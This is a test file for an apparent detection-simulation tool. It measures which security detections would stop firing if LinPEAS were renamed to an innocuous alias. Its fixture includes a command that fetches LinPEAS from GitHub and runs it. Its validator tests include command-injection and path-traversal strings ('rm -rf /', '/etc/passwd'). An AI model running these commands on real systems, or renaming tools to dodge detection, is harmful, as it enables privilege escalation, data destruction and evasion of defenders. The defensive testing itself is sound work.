import { describe, it, expect } from 'vitest'
import {
  partitionByFilename, previewSteps, validateStagePath, neutralAliasFor,
  filenameTokens, ttpRefsOf,
} from '../console/renameImpact.js'

/**
 * The rename control's evidence, tested against the SHAPE OF THE REAL CORPUS —
 * SIM-CDR-001 step-05 and TTP-2026-0022, whose BIOC literally reads
 * `| filter action_process_image_command_line contains "linpeas"`.
 */

const scenario = {
  scenario_id: 'SIM-CDR-001',
  steps: [
    {
      id: 'step-05',
      name: 'Download and run LinPEAS',
      command: 'curl -sSL https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh '
        + '-o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && timeout 60 bash /tmp/linpeas.sh -q',
      expected_detections: [
        {
          plane: 'CDR', type: 'BIOC', ttp_ref: 'TTP-2026-0022',
          description: 'LinPEAS execution in container',
          detection_id: 'bioc-cdr-001-linpeas-privilege-escalation-tool-in-container',
        },
        {
          plane: 'CDR', type: 'BIOC', ttp_ref: 'TTP-2026-0022',
          description: 'Multiple system enumeration commands executed in sequence',
          detection_id: 'bioc-cdr-001-automated-discovery-command-burst-in-container',
        },
        {
          plane: 'CDR', type: 'BIOC', ttp_ref: 'TTP-2026-0022',
          description: 'Sensitive file read fan-out',
          detection_id: 'bioc-cdr-001-etc-shadow-read-in-container',
        },
      ],
    },
  ],
}

const card = {
  id: 'TTP-2026-0022',
  detections: {
    biocs: [
      {
        name: 'CDR-001 LinPEAS Privilege Escalation Tool In Container',
        description: 'LinPEAS execution detected',
        logic: 'preset = xdr_data\n| filter action_process_image_command_line contains "linpeas"',
      },
      {
        name: 'CDR-001 Automated Discovery Command Burst In Container',
        // Prose that MENTIONS the tool but a query that does not key on it.
        description: 'Bursty discovery typical of linpeas-style sweeps',
        logic: 'preset = xdr_data\n| filter action_process_image_name in ("id","uname","find")\n| comp count() by container_id',
      },
    ],
    xql_queries: [],
    correlation_rules: [],
    iocs: [],
  },
}

describe('partitionByFilename', () => {
  it('flags a detection whose IDENTIFIER names the tool', () => {
    const r = partitionByFilename({ scenario, cards: { 'TTP-2026-0022': card }, filename: 'linpeas.sh' })
    const ids = r.nameKeyed.map((d) => d.detection_id)
    expect(ids).toContain('bioc-cdr-001-linpeas-privilege-escalation-tool-in-container')
  })

  it('does NOT flag a detection whose DESCRIPTION mentions the tool but whose query does not', () => {
    // Counting prose would inflate the suppressed column with detections that
    // will in fact fire — the run would then read as a regression.
    const r = partitionByFilename({ scenario, cards: { 'TTP-2026-0022': card }, filename: 'linpeas.sh' })
    const ids = r.notNameKeyed.map((d) => d.detection_id)
    expect(ids).toContain('bioc-cdr-001-automated-discovery-command-burst-in-container')
  })

  it('quotes the matching query line as evidence', () => {
    const cardOnlyQuery = {
      detections: {
        biocs: [{
          name: 'CDR-001 Etc Shadow Read In Container',
          logic: 'preset = xdr_data | filter action_file_path = "/tmp/linpeas.sh"',
        }],
      },
    }
    const r = partitionByFilename({
      scenario, cards: { 'TTP-2026-0022': cardOnlyQuery }, filename: 'linpeas.sh',
    })
    const hit = r.nameKeyed.find((d) => d.detection_id === 'bioc-cdr-001-etc-shadow-read-in-container')
    expect(hit.evidence).toBe('query')
    expect(hit.snippet).toContain('/tmp/linpeas.sh')
  })

  it('puts a detection in UNKNOWN — not "behavioural" — when its card could not be read', () => {
    const r = partitionByFilename({ scenario, cards: { 'TTP-2026-0022': null }, filename: 'linpeas.sh' })
    const unknownIds = r.unknown.map((d) => d.detection_id)
    expect(unknownIds).toContain('bioc-cdr-001-automated-discovery-command-burst-in-container')
    expect(r.notNameKeyed).toHaveLength(0)
    expect(r.cardsMissing).toContain('TTP-2026-0022')
  })

  it('puts a detection in UNKNOWN when the card loaded but nothing maps to its id', () => {
    const r = partitionByFilename({
      scenario, cards: { 'TTP-2026-0022': { detections: { biocs: [] } } }, filename: 'linpeas.sh',
    })
    // The identifier-keyed one is still certain; the other two are unknown.
    expect(r.nameKeyed).toHaveLength(1)
    expect(r.unknown).toHaveLength(2)
    expect(r.notNameKeyed).toHaveLength(0)
  })

  it('derives both the filename and its stem as match tokens', () => {
    expect(filenameTokens('linpeas.sh')).toEqual(['linpeas.sh', 'linpeas'])
    expect(filenameTokens('nuclei')).toEqual(['nuclei'])
  })

  it('collects every ttp_ref a scenario names', () => {
    expect(ttpRefsOf(scenario)).toEqual(['TTP-2026-0022'])
  })
})

describe('previewSteps', () => {
  it('flags a step that downloads the tool itself — a rename does NOT change it', () => {
    const steps = previewSteps({
      scenario, adapterId: 'TOOL-LINPEAS', payloadName: 'linpeas.sh',
      destPath: '/tmp/.cache/sysinfo.sh', defaultPath: '/tmp/linpeas.sh',
    })
    expect(steps).toHaveLength(1)
    expect(steps[0].shape).toBe('inline_fetch')
    expect(steps[0].inlineFetch).toBe(true)
  })

  it('substitutes the adapter token, which IS resolved at dispatch', () => {
    const s = {
      steps: [{ id: 'step-02', name: 'run it', command: 'timeout 60 {adapter:TOOL-LINPEAS} -q' }],
    }
    const steps = previewSteps({
      scenario: s, adapterId: 'TOOL-LINPEAS', payloadName: 'linpeas.sh',
      destPath: '/tmp/.cache/sysinfo.sh', defaultPath: '/tmp/linpeas.sh',
    })
    expect(steps[0].shape).toBe('adapter_token')
    expect(steps[0].rewritten).toBe('timeout 60 /tmp/.cache/sysinfo.sh -q')
  })

  it('ignores steps that never touch the artifact', () => {
    const s = { steps: [{ id: 'step-01', command: 'apt-get update -qq' }] }
    expect(previewSteps({
      scenario: s, adapterId: 'TOOL-LINPEAS', payloadName: 'linpeas.sh',
      destPath: '/tmp/x.sh', defaultPath: '/tmp/linpeas.sh',
    })).toHaveLength(0)
  })
})

describe('validateStagePath', () => {
  it('accepts a neutral alias under an allowed root', () => {
    expect(validateStagePath('/tmp/.cache/sysinfo.sh').ok).toBe(true)
  })

  it('refuses a system path — CortexSim does not install onto a host it does not own', () => {
    const r = validateStagePath('/usr/bin/x')
    expect(r.ok).toBe(false)
    expect(r.error).toMatch(/\/tmp/)
  })

  it('refuses a relative path and traversal', () => {
    expect(validateStagePath('../x').ok).toBe(false)
    expect(validateStagePath('/tmp/../etc/passwd').ok).toBe(false)
  })

  it('refuses shell metacharacters', () => {
    expect(validateStagePath('/tmp/a; rm -rf /').ok).toBe(false)
    expect(validateStagePath('/tmp/`id`').ok).toBe(false)
  })

  it('warns — but does not block — a name that shadows a system binary', () => {
    const r = validateStagePath('/tmp/bash')
    expect(r.ok).toBe(true)
    expect(r.warning).toMatch(/shadows/)
  })

  it('suggests a neutral alias that keeps the extension', () => {
    expect(neutralAliasFor('linpeas.sh')).toBe('/tmp/.cache/sysinfo.sh')
  })
})
